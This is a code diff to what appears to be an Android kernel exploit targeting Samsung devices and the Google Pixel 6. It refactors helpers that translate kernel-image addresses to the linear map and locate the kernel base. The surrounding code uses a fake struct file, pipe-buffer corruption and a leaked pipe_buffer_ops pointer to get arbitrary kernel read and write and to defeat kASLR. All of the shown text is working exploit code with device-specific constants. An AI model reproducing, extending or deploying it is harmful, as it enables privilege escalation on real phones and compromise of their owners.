@@ -31,6 +31,21 @@
 #include "kernel_constants.h"
 #include "uao.h"
 
+u64 samsung_kimg_to_lm(struct rw_info *rw, u64 kaddr) {
+    return kaddr - 0x4010000000UL + dev_config->ram_offset;
+}
+
+u64 pixel_kimg_to_lm(struct rw_info *rw, u64 kaddr) {
+    return 0xffffff8000000000UL + (kaddr - rw->ki.kernel_base);
+}
+
+static inline u64 kimg_to_lm(struct rw_info *rw, u64 kaddr) {
+    if (is_lm_addr(kaddr)) {
+        return kaddr;
+    }
+    return dev_config->kimg_to_lm(rw, kaddr);
+}
+
 void prepare_fake_struct_file(void *buffer, int f_count, int f_mode) {
 #define set64(buf, offset, val) do { *(u64 *)&(buf)[(offset)] = (val); }while(0)
 #define set32(buf, offset, val) do { *(u32 *)&(buf)[(offset)] = (val); }while(0)
@@ -203,16 +218,6 @@ bool identify_pipe(int *ptmxs, int nr_ptmx, int *pipes, int nr_pipes, int *ptmx_
     return false;
 }
 
-static inline u64 to_lm(struct rw_info *rw, u64 kaddr) {
-    if (is_lm_addr(kaddr)) {
-        return kaddr;
-    }
-    if (is_device("Google Pixel 6")) {
-        return 0xffffff8000000000UL + (kaddr - rw->ki.kernel_base) + dev_config->ram_offset;
-    }
-    return kaddr - 0x4010000000UL + dev_config->ram_offset;
-}
-
 void reset_pipe(struct rw_info *rw) {
     struct pipe_buffer pipe_buf;
     memset(&pipe_buf, 0, sizeof(struct pipe_buffer));
@@ -249,7 +254,7 @@ void __pipe_kwrite(int ptmx, int pipefd[2], u64 buf_ops, u64 kaddr, void *buf, u
 
 int pipe_kwrite(struct rw_info *rw, u64 kaddr, void *buf, u64 size) {
     int buf_offset = 0;
-    kaddr = to_lm(rw, kaddr);
+    kaddr = kimg_to_lm(rw, kaddr);
     while(size) {
         int page_offset = kaddr & 0xfff;
         int len =  size > (0x1000-page_offset) ? (0x1000-page_offset) : size;
@@ -287,7 +292,7 @@ void __pipe_kread(int ptmx, int pipefd[2], u64 buf_ops, u64 kaddr, void *buf, u6
 int pipe_kread(struct rw_info *rw, u64 kaddr, void *buf, u64 size) {
     u8 tmp_buf[0x1000];
     int buf_offset = 0;
-    kaddr = to_lm(rw, kaddr);
+    kaddr = kimg_to_lm(rw, kaddr);
     while (size) {
         int page_offset = kaddr & 0xfff;
         int len =  size > (0x1000-page_offset) ? (0x1000-page_offset) : size;
@@ -527,7 +532,7 @@ int pipe_close(struct rw_info *rw) {
     return 0;
 }
 
-u64 scan_for_kbase(struct rw_info *rw) {
+u64 scan_kbase(struct rw_info *rw) {
     u8 tmp_buf[0x40];
     for (u64 kaddr = rw->ki.pipe_buffer_ops & ~0xfff; 
     kaddr >= 0xffffffc000000000UL; kaddr -= 0x1000) 
@@ -538,6 +543,26 @@ u64 scan_for_kbase(struct rw_info *rw) {
         }
     }
     return 0;
+}
+
+u64 noop_kbase(struct rw_info *rw) {
+    /*
+     * This is suitable if it's possible to scan
+     * the kernel linear mapping without knowing
+     * the virtual kASLR slide.
+     * In this case, we first find kallsyms
+     * internal data structures and then lookup
+     * the kernel base.
+     */
+    return 0;
+}
+
+u64 offset_kbase(struct rw_info *rw) {
+    return rw->ki.pipe_buffer_ops - OFFCHK(dev_config->kconsts.kernel_offsets.k_anon_pipe_buf_ops);
+}
+
+static inline u64 find_kbase(struct rw_info *rw) {
+    return dev_config->find_kbase(rw);
 }
 
 int find_task_struct_offsets(struct rw_info *rw) {
@@ -676,12 +701,11 @@ int get_stable_rw(struct rw_info *rw) {
     LOG("[x] Leaked pipe buffer oprerations: %016lx\n", rw->ki.pipe_buffer_ops);
     LOG("[x] Leaked pipe buffer page       : %016lx\n", rw->ki.pipe_buffer_page);
 
-    /* For the Pixel 6, we find kernel base using kallsyms.
+    /* 
+     * For the Pixel 6, we find kernel base using kallsyms.
      * For Samsung-based devices we find kernel base by scanning backwards.
      */
-    if (!is_device("Google Pixel 6")) {
-        rw->ki.kernel_base = scan_for_kbase(rw);
-    }
+    rw->ki.kernel_base = find_kbase(rw);
 
     rw->kread = pipe_kread;
     rw->kwrite = pipe_kwrite;
